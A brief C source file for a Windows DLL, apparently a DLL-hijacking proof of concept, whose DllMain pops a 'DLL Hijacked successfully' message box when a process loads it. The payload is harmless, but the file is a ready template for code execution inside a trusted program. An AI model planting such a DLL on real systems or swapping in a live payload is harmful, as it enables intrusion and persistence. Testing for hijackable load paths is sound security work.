#include <windows.h>


BOOL WINAPI DllMain(
		HINSTANCE hinstDLL, //dll handle
		DWORD fdwReason, //reason for calling the function
		LPVOID lpReserved //reserved
		)
{

	switch ( fdwReason ){
		case DLL_PROCESS_ATTACH:
			//display msg_box when dll is attached to a process
			MessageBox(NULL,"DLL Hijacked successfully","DLL hijacked",MB_ICONERROR|MB_OK);
			break;
		case DLL_THREAD_ATTACH:
			break;
		case DLL_THREAD_DETACH:
			break;
		case DLL_PROCESS_DETACH:
			break;
	}

	
	return TRUE;	
}
